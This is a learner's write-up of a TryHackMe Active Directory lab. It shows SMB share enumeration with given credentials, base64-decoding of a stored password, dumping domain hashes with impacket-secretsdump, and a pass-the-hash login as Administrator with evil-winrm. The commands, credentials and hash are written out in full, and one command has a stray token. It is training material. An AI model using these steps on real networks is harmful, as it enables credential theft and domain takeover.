```
URL : https://tryhackme.com/room/attacktivedirectory
Description: 99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?
ip : 10.10.15.181
```


So this is about Active directory which i have little experience with. I've done some rooms but nothing really "stuck" with me, so ill have to start from scratch:

Lets start with a nmap scan on the 1000 most known ports:

| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC  |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn  |
| 3268/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 3269/tcp | open | tcpwrapped |   |
| 3389/tcp | open | ms-wbt-server | Microsoft Terminal Services  |
| 389/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 445/tcp | open | microsoft-ds |   |
| 464/tcp | open | kpasswd5 |   |
| 53/tcp | open | domain | Simple DNS Plus  |
| 593/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 636/tcp | open | tcpwrapped |   |
| 80/tcp | open | http | Microsoft IIS httpd 10.0 |
| 88/tcp | open | kerberos-sec | Microsoft Windows Kerberos  |2


We see a lot of open ports here, lets see what is happening on port 80 in a browser. This just shows a basic introduction screen to Windows server.

Since Kerboros works mostly only with Domains, we add the machine IP to the given .

``sudo echo "<ip> spookysec.local" >> /etc/hosts``

This registers the domain name for that ip and we can proceed.

For this assignment, the user/password lists were adjusted 4

user: svc-admin
password: management2005

Now that we have a user and his credentials, we can scan for SMB mounts we can check for usefull files/explotable entrances.
We use `smbclient` to enumerate samba shares and see whatsup


```
smbclient -L 10.10.166.85 --user=svc-admin%management2005 | tee smbclient_enum.txt

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available

```
the "backup" mount jumps out as something that might have useful information, lets connect to it:

``smbclient //10.10.166.85/backup --user=svc-admin%management2005``

Here we find a `backup_credentials.txt` file with some sort of encrypted string.

```
─$ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw"
| base64 -d

backup@spookysec.local:backup2517860       
```

On a whim we will base64 decode it see if it resolves with any usefull information, and there! we have found more account credentials which most likely escalate our permissions!

Now the Walkthrough tells us to use this Backup information to "dumpSecrets" with this backup account. lets try it.



`sudo impacket-secretsdump backup:backup2517860@spookysec.local | tee "secretsdump_output.txt"`
This gives as a giant file you can check in the root folder called secretsdump_output.txt. This shows us alot of hashes aand usefull information. Ofcourse we're interested in the Administrator account. 

From this we get a giant list of dumped Credentials, we can use these credentials to log-in with the Master account `Administrator` by using a technique called "pass the hash". This allows us to use the hash as credentials to login with the Administrator account.

For this we use software called Evil Win-Rm, and we pass the hash we found from this line to it.

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::`

`sudo evil-winrm _2.3_ -i 10.10.145.103 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`

*NOTE*
  This does not work from my Kali-vm for some reason, and i cannot figure out why. I've tried to downgrade the evil-winrm to version 2.3 which i found somewhere in a writeup and some other things, but i could not get it to work :(

  What i did instead is use the TryHackMe provided Attack-box and it worked like a charm with the exact same command. Probably some VPN thing.

In the end, this gave us a PowerShell as Administrator and allowed us to fill in the 3 flags that were required by simply navigating to `Users\svc-admin Users\backup and Users\Administrator\Desktop`.

Conclusion:

I've learned alot from this room as i have used some of the tools before and my knowledge of Windows Active directory is still very limited. But This was a fun and challenging task, especially because the Evil-winrm didnt want to work on my local machine :).
